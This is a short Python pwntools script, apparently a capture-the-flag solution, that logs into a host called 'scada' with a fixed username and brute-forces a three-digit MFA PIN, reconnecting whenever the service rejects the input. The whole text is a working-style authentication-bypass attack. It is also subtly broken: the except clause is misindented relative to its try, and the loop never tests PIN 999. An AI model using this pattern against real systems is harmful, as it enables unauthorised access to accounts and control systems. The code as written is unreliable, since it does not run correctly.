from pwn import *
while True:
    io = remote("scada", 1338)
    io.recvuntil(':')
    io.send("Joe5Farnaby")
    io.recvuntil(':')
    try:
        for i in range(999):
            pin = str(i).zfill(3)
            io.sendline(pin)
            data = io.recv()
            if b"Welcome back" in data:
                # PIN worked, we are in!
                io.recvline()
                io.recvline()
                io.recvline()
                io.recvline()
                exit(0)
            elif b"too many digits" in data:
                # You have entered too many digits for the MFA check
                # Reset connection
                break
            # else: the provided PIN was not correct
        except Exception as e:
            print("Exception in client:", e)
    io.close()
